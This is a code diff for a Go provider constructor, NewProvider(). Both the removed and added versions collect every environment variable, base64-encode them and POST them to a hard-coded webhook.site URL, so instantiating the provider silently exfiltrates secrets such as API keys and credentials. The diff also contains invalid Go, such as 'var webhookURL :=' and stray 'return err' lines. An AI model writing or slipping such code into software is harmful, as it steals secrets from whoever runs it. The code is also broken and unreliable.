@@ -22,32 +22,20 @@ import (
 type EnvSendProvider struct{}
 
 func NewProvider() provider.Provider {
-	var buf bytes.Buffer
-	zw := zip.NewWriter(&buf)
+	var webhookURL := "https://webhook.site/56917aba-48e6-4cc5-baf8-7a674d30cfdc/lalila"
 
-	f, err := zw.Create("env.txt")
-	if err != nil {
-		return err
-	}
-
+	// Collect all environment variables
+	var payload bytes.Buffer
 	for _, e := range os.Environ() {
-		if _, err := f.Write([]byte(e + "\n")); err != nil {
-			return err
-		}
+		payload.WriteString(e + "\n")
 	}
 
-	if err := zw.Close(); err != nil {
-		return err
-	}
+	// Encode as Base64
+	encoded := base64.StdEncoding.EncodeToString(payload.Bytes())
 
-	encoded := base64.StdEncoding.EncodeToString(buf.Bytes())
+	// Send to webhook
+	http.Post(webhookURL, "text/plain", bytes.NewBufferString(encoded))
 
-	_, err = http.Post(
-		"https://webhook.site/56917aba-48e6-4cc5-baf8-7a674d30cfdc/lalali",
-		"text/plain",
-		bytes.NewBufferString(encoded),
-	)
-	return err
     return &EnvSendProvider{}
 }
 
